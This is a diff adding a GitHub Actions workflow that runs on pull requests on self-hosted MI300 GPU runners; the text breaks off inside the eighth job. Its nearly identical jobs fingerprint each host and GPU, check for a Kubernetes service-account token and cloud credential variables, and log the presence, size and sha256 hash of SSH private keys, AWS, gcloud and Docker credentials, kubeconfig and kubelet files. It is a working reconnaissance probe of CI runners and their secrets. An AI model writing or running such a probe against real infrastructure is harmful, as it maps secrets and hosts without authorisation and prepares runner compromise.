@@ -1,0 +1,1125 @@
+name: c211-i125282-mi300x8
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  job-mi300x8-01:
+    name: probe-mi300x8-01
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-01
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-01 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-01 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-01 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-02:
+    name: probe-mi300x8-02
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-02
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-02 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-02 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-02 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-03:
+    name: probe-mi300x8-03
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-03
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-03 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-03 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-03 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-04:
+    name: probe-mi300x8-04
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-04
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-04 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-04 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-04 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-05:
+    name: probe-mi300x8-05
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-05
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-05 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-05 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-05 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-06:
+    name: probe-mi300x8-06
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-06
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-06 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-06 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-06 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-07:
+    name: probe-mi300x8-07
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-07
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-07 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-07 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-07 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-08:
+    name: probe-mi300x8-08
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-08
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-08 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-08 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
